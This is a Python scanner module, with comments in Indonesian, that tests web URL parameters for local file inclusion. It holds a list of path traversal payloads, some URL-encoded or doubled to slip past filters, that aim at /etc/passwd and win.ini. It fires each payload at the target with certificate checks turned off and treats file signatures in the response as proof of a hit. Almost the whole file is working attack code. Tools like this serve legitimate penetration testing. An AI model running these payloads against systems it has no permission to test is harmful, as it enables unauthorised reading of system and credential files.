import requests

# Local File Inclusion / Directory Traversal payloads
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
]

# Signature file yang menandakan LFI berhasil
LFI_SIGNATURES = {
    "linux": ["root:x:", "daemon:", "/bin/bash", "/bin/sh"],
    "windows": ["[extensions]", "[fonts]", "for 16-bit app support"],
}

def test_lfi(url, params):
    """Test Local File Inclusion / Directory Traversal."""
    results = []
    
    for param in params:
        for payload in LFI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                response = requests.get(url, params=test_params, timeout=10, verify=False)
                body = response.text.lower()
                
                # Cek signature Linux
                for sig in LFI_SIGNATURES["linux"]:
                    if sig.lower() in body:
                        results.append({
                            "type": "Local File Inclusion (LFI)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "detail": f"File /etc/passwd terdeteksi (signature: '{sig}')"
                        })
                        return results
                
                # Cek signature Windows
                for sig in LFI_SIGNATURES["windows"]:
                    if sig.lower() in body:
                        results.append({
                            "type": "Local File Inclusion (LFI)",
                            "severity": "CRITICAL",
                            "param": param,
                            "payload": payload,
                            "detail": f"File win.ini terdeteksi (signature: '{sig}')"
                        })
                        return results
                        
            except requests.RequestException:
                pass
    
    return results
